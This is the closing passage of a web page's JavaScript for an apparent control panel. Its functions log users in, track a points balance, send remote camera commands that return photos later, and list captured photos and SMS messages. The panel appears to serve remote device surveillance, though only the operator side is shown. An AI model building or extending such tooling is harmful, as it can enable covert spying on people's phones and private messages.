    toast("Command sent — photo will arrive soon", "success");
  } catch (e) {
    hideOverlay();
    try {
      const updPath = `/tablesdb/${DB}/tables/${T_USERS}/rows/${state.userRow.$id}`;
      await api("PATCH", updPath, { data: { points } });
      state.userRow.points = points;
      updatePointsUI();
    } catch (e2) {}
    toast("Failed: " + e.message, "error");
  }
}

function updatePointsUI() {
  const p = state.userRow && state.userRow.points != null ? state.userRow.points : 0;
  $("camPoints").textContent = p;
  $("profPoints").textContent = p;
}

/* ═══ BOOT ═══ */
async function boot() {
  try {
    const account = await getAccount();
    if (!account || !account.$id) throw new Error("No session");
    state.user = account;
    const row = await findUserRow(account.$id, account.email);
    if (!row) {
      showLoginError("Account ရှိပေမဲ့ users table မှာ row မတွေ့ပါ");
      return;
    }
    state.userRow = row;
    enterApp();
  } catch (e) {
    $("loginScreen").style.display = "flex";
    $("appScreen").classList.remove("show");
  }
}

function enterApp() {
  $("loginScreen").style.display = "none";
  $("appScreen").classList.add("show");
  $("headerUser").textContent = state.userRow.displayName || state.userRow.email || "User";
  $("profName").textContent = state.userRow.displayName || "-";
  $("profEmail").textContent = state.userRow.email || "-";
  $("profUserId").textContent = state.userRow.userId || "-";
  $("profStatus").textContent = state.userRow.isActive ? "Active" : "Inactive";
  updatePointsUI();
  loadPhotos();
  loadSms();
}

/* ═══ EVENTS ═══ */
$("loginBtn").onclick = async () => {
  hideLoginError();
  const email = $("emailInput").value.trim();
  const password = $("passwordInput").value;
  if (!email || !password) { showLoginError("Email နှင့် Password ဖြည့်ပါ"); return; }
  const btn = $("loginBtn");
  btn.disabled = true;
  btn.querySelector("span").textContent = "Logging in...";
  try {
    await doLogin(email, password);
    await boot();
  } catch (e) {
    showLoginError(e.message);
  } finally {
    btn.disabled = false;
    btn.querySelector("span").textContent = "Login";
  }
};

$("passwordInput").addEventListener("keydown", (e) => {
  if (e.key === "Enter") $("loginBtn").click();
});

document.querySelectorAll(".nav-btn").forEach(btn => {
  btn.onclick = () => {
    document.querySelectorAll(".nav-btn").forEach(t => t.classList.remove("active"));
    document.querySelectorAll(".section").forEach(s => s.classList.remove("active"));
    btn.classList.add("active");
    const target = $("sec-" + btn.dataset.tab);
    if (target) target.classList.add("active");
    if (btn.dataset.tab === "photos") loadPhotos();
    if (btn.dataset.tab === "sms") loadSms();
  };
});

document.querySelectorAll(".cam-btn").forEach(btn => {
  btn.onclick = () => sendCameraCommand(btn.dataset.cam);
});

$("refreshPhotos").onclick = () => { showOverlay("Refreshing..."); loadPhotos().finally(hideOverlay); };
$("refreshSms").onclick = () => { showOverlay("Refreshing..."); loadSms().finally(hideOverlay); };

$("logoutBtn").onclick = async () => {
  if (!confirm("Logout လုပ်မှာ သေချာလား?")) return;
  try {
    await fetch(API + "/account/sessions/current", {
      method: "DELETE",
      headers: { "X-Appwrite-Project": PROJECT },
      credentials: "include",
    });
  } catch (e) {}
  location.reload();
};

boot();
</script>
</body>
</html>
